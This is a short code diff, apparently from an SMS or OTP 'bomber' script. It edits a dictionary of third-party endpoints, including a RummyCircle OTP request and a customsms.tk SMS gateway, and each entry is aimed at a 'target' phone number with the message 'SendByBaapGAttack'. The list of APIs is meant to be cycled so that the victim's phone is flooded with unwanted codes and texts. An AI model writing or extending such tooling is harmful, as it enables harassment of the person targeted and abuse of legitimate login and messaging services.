@@ -4,7 +4,7 @@ apidata = {
 
 "Rummycircle":(f"https://www.rummycircle.com/api/fl/auth/v3/getOtp",{"mobile":target,"deviceId":"d6be3862-7659-46c0-98b9-3d13328a243c","deviceName":"","refCode":"","isPlaycircle":"false"},{},"POST",'''success":true'''),
 
-"Kisan":(f"https://www.customsms.tk/sms.php?num={number}&msg=SendByBaapGAttack",{},"GET",'''000''')
+"Kisan":(f"https://www.customsms.tk/sms.php?num={target}&msg=Send%By%BaapG%Attack",{},"GET",'''000''')
 
 }
 apis = [apidata["Byjus"],apidata["Rummycircle"],apidata["Kisan"]]
